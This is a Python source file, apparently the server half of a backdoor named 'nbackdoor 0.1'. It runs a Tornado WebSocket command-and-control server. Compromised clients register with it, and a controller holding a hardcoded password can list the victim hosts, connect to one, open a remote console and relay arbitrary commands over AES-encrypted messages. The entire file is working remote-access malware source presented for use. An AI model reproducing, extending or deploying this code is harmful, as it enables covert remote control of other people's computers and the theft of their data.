#!/usr/bin/env python
# -*- coding: utf-8 -*-
from _docpot import docopt
import tornado.web
import tornado.websocket
import tornado.ioloop
import json
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
__author__ = 'nekocode'

# config
PASSWORD = '110110zxc'


class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
    clients = {}
    ID_LASTEST = 0

    def data_received(self, chunk):
        pass

    def send_to_all(self, message):
        for key, c in self.clients:
            c.write_message(json.dumps(message))

    def __init__(self, app, request, **kwargs):
        tornado.websocket.WebSocketHandler.__init__(self, app, request, **kwargs)
        self.HOST_NAME = None
        self.ID = None
        self.UUID = None
        self.IV = '\0' * AES.block_size
        self.SECRET = None
        self.is_controller = False
        self.to_client_id = None
        self.jobs = list()

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return ciphertext

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(ciphertext)
        return plain

    def open(self):
        pass

    def on_close(self):
        if self.ID in self.clients:
            self.clients.pop(self.ID)

    def send_data(self, data):
        self.write_message(self.encrypt(json.dumps({'data': b64encode(data)})), True)

    def send_end(self):
        self.write_message(self.encrypt(json.dumps({'end': 'true'})), True)

    def send_json(self, jsonobj):
        self.write_message(self.encrypt(json.dumps(jsonobj)), True)

    def on_message(self, message):
        if self.UUID is not None and self.SECRET is not None:
            # --Command--
            json_str = self.decrypt(message)
            msg = json.loads(json_str)

            if self.is_controller and 'cmd' in msg:
                command = b64decode(msg['cmd'])
                print command
                self.parse_command(command)

            elif not self.is_controller and 'to' in msg:
                to = msg['to']
                if 'connected' in msg and to is not None:
                    if to in self.clients:
                        to_controler = self.clients[to]
                        to_controler.to_client_id = self.ID
                        to_controler.send_json({'connected': self.ID})

                elif ('data' in msg or 'char' in msg or 'end' in msg) and to is not None:
                    if to in self.clients:
                        to_controler = self.clients[to]
                        to_controler.to_client_id = self.ID
                        to_controler.send_json(msg)

        else:
            # =====================
            # ======= Login =======
            # =====================
            msg = json.loads(message)

            if 'uuid' in msg:
                self.UUID = msg['uuid']
                self.HOST_NAME = msg['host_name']
                self.SECRET = b64decode(msg['secret'])
                if 'pwd' in msg:
                    if PASSWORD == self.decrypt(b64decode(msg['pwd'])):
                        self.is_controller = True
                        self.send_data('login success')
                    else:
                        self.send_data('login failed')
                        return

                self.ID = self.ID_LASTEST
                self.clients[self.ID] = self
                print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
                BackdoorSocketHandler.ID_LASTEST += 1

    def control_to_client(self, json_obj):
        if self.to_client_id in self.clients:
            to = self.clients[self.to_client_id]
            to.send_json(json_obj)
        else:
            self.to_client_id = None
            self.send_json({'disconnected': 'offline'})

    def parse_command(self, cmd):
        input_array = cmd.strip().split()
        command_str = input_array[0]

        if command_str != 'hack':
            if self.to_client_id is None:
                self.send_data('No aviable command.\n')
                self.send_end()
            else:
                self.control_to_client({'cmd': b64encode(cmd)})

            return

        try:
            arguments_str = input_array[1:]
            doc = """Usage:
  hack connect <client_id>
  hack (list | exit)
  hack new cmd
  hack (-h | --help)
  hack --version

Options:
  connect <client_id>   Connect to client.
  list                  List all online client.
  exit                  Disconnect linked client.
  new cmd               Strat a new consloe.
  -h --help             Show this.
  --version             Show version.
"""
            args = docopt(doc, argv=arguments_str, help=True, version='nbackdoor 0.1', options_first=False)

            # ===================
            # ===== connect =====
            # ===================
            if args['connect']:
                if self.to_client_id is not None:
                    self.send_data('Diconnect first.\n')
                    self.send_end()
                    return

                to = int(args['<client_id>'])
                if to in self.clients:
                    to_client = self.clients[to]
                    if not to_client.is_controller:
                        to_client.send_json({'new_consloe': self.ID})
                    else:
                        self.send_data('You can not connect to a control-client.\n')
                        self.send_end()

                else:
                    self.send_data('Not available target.\n')
                    self.send_end()

            # ====================
            # ==== disconnect ====
            # ====================
            elif args['exit']:
                if self.to_client_id is not None:
                    self.to_client_id = None
                    self.send_json({'disconnected': ''})

                else:
                    self.send_data('You have not connected to any clients.\n')
                    self.send_end()

            # ====================
            # ======= list =======
            # ====================
            elif args['list']:
                data = ''
                for key, client in self.clients.items():
                    data += str(key) + '\t' + client.HOST_NAME + '\t' + \
                            client.request.remote_ip + '\t' + client.UUID + '\n'

                self.send_data(data)
                self.send_end()

            # ===================
            # === new console ===
            # ===================
            elif args['new'] and args['cmd']:
                to = self.to_client_id
                if to is None:
                    self.send_data('You have not connected to any clients.\n')
                    self.send_end()
                else:
                    self.control_to_client({'new_consloe': self.ID})

        except SystemExit as e:
            self.send_data(e.message)
            self.send_end()

        except Exception as e:
            self.send_data('unkown err: ' + e.message + '\n')
            self.send_end()


application = tornado.web.Application([
    (r'/', BackdoorSocketHandler)
])


if __name__ == '__main__':
    application.listen(8888, xheaders=True)
    tornado.ioloop.IOLoop.instance().start()

